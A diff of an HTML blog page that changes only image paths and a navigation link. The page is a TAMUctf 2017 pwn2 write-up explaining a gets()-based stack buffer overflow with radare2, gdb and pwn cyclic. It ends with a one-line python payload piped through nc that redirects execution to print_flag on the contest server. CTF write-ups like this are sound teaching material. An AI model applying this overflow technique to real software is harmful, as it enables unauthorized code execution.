@@ -81,7 +81,7 @@
                     <div class="hmdl-page-content mdl-color-text--grey-700 mdl-card__supporting-text">
                         
 
-<p><img src="assets/1-pwn2_description.png" alt="Pwn2 challenge description" /></p>
+<p><img src="/assets/1-pwn2_description.png" alt="Pwn2 challenge description" /></p>
 
 <p>We are given a source code file and a binary which is being run remotely.
 Let&rsquo;s a analyze it with radare2:</p>
@@ -107,13 +107,13 @@ $ r2 pwn2
 <p>We realize that <strong>print_flag</strong> function, which is responsible for printing the flag stored in <strong>flag.txt</strong>, is never called!<br />
 Instead a new function named <strong>echo</strong> is called from <strong>main</strong> function.</p>
 
-<p><img src="assets/2-pwn2_call_echo_in_main.png" alt="Pwn2 call in main function" /></p>
+<p><img src="/assets/2-pwn2_call_echo_in_main.png" alt="Pwn2 call in main function" /></p>
 
 <p>Lets see what it does:</p>
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ pdf @ sym.echo
 </pre></div>
 
-<p><img src="assets/3-pwn2_echo_function.png" alt="Pwn2 echo function content" /></p>
+<p><img src="/assets/3-pwn2_echo_function.png" alt="Pwn2 echo function content" /></p>
 
 <p>Ok, so aparently it just prints back whatever you input before. But hey! To read your input it uses <code>gets</code> insecure function again!  That means we can write beyond the allocated memory for our input.
 &gt; &ldquo;All right, but this case is not like the previous one! (<a href="../pwn1/pwn1.md">pwn1 challenge</a>).<br />
@@ -130,11 +130,11 @@ When a function is going to be called, some data is going to be pushed into the 
 <p>The purpose of EIP register (or instruction pointer) is to indicate the CPU which instruction has to be executed after the current one. When the <strong>echo</strong> function will finish the CPU will need to continue the execution right after the call.<br />
 Like this:</p>
 
-<p><img src="assets/4-pwn2_normal_flow.png" alt="Pwn2 Normal execution flow" /></p>
+<p><img src="/assets/4-pwn2_normal_flow.png" alt="Pwn2 Normal execution flow" /></p>
 
 <p>And the stack will look like:</p>
 
-<p><img src="assets/5-pwn2_stack_view.png" alt="Pwn2 Stack view on echo call" /></p>
+<p><img src="/assets/5-pwn2_stack_view.png" alt="Pwn2 Stack view on echo call" /></p>
 
 <p>Nice :v:!, looking at the stack we realize we could just write a bunch of bytes until we reach the <strong>Saved EIP</strong> value!</p>
 
@@ -149,7 +149,7 @@ $ gdb pwn2                                  <span style="color: #75715e"># We op
 <span style="color: #f92672">(</span>gdb<span style="color: #f92672">)</span> run &lt; input.txt                       <span style="color: #75715e"># Run the binary with the content of input.txt as input.</span>
 </pre></div>
 
-<p><img src="assets/6-pwn2_gdb.png" alt="Pwn2 GDB executing pwn2" /></p>
+<p><img src="/assets/6-pwn2_gdb.png" alt="Pwn2 GDB executing pwn2" /></p>
 
 <p>We ran the binary with gdb and passed 500 &ldquo;A&rdquo;s as input.
 That <code>0x41414141</code> means that we have overwritten EIP register with value &ldquo;AAAA&rdquo; and the process crashed when it tried to execute the instrucction of that address (obviously there is nothing there).</p>
@@ -165,7 +165,7 @@ $ gdb pwn2
 <span style="color: #f92672">(</span>gdb<span style="color: #f92672">)</span> run &lt; input.txt
 </pre></div>
 
-<p><img src="assets/7-pwn2_gdb_cyclic.png" alt="Pwn2 GDB Executing pwn2" /></p>
+<p><img src="/assets/7-pwn2_gdb_cyclic.png" alt="Pwn2 GDB Executing pwn2" /></p>
 
 <p>To check that value we do:</p>
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ pwn cyclic -l 0x6261616b
@@ -174,7 +174,7 @@ $ gdb pwn2
 
 <p>And finally, after 140 Characters we write a new address to continue the execution. Which address? the address of the <strong>print_flag</strong> function, of course! The new execution flow will look like this:</p>
 
-<p><img src="assets/8-pwn2_modified_flow.png" alt="Pwn2 Modified execution flow" /></p>
+<p><img src="/assets/8-pwn2_modified_flow.png" alt="Pwn2 Modified execution flow" /></p>
 
 <p>Lets get our flag:</p>
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;A&quot;*140 + &quot;\x4b\x85\x04\x08&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> nc pwn.ctf.tamu.edu <span style="color: #ae81ff">4321</span> 
@@ -216,7 +216,7 @@ gigem<span style="color: #f92672">{</span>D34D_FUNC_R1S1NG<span style="color: #f
                         Older
                     </a>
                     <div class="section-spacer"></div>
-                    <a href="/post/tamuctf2017/pwn3/">
+                    <a href="/post/tamuctf2017/pwn4/">
                         Newer
                         <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                             <i class="icon ion-android-arrow-forward"></i>
